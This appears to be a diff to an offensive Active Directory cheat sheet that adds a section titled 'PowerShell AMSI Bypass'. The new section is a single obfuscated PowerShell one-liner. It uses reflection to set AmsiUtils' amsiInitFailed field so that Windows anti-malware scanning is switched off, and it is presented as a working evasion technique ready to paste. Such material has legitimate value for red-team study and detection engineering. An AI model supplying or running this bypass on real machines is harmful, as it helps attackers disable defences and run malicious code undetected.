@@ -5,6 +5,7 @@ This cheat sheet contains common enumeration and attack methods for Windows Acti
 Last update: **29 Nov 2021**
 ## Table of Contents
 - [Pre-requisites](#pre-requisites)
+- [PowerShell AMSI Bypass](#PowerShell-AMSI-Bypass)
 - [Windows Defender](#windows-defender)
 - [Enumeration](#enumeration)
   -  [Users Enumeration](#users-enumeration)
@@ -58,6 +59,12 @@ Import-Module .\Microsoft.ActiveDirectory.Management.dll
 Import-Module .\ActiveDirectory\ActiveDirectory.psd1
 ```
 Link: [AD Module](https://github.com/samratashok/ADModule)
+
+# PowerShell AMSI Bypass
+```powershell
+# AMSI bypass
+S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
+```
 
 # Windows Defender
 
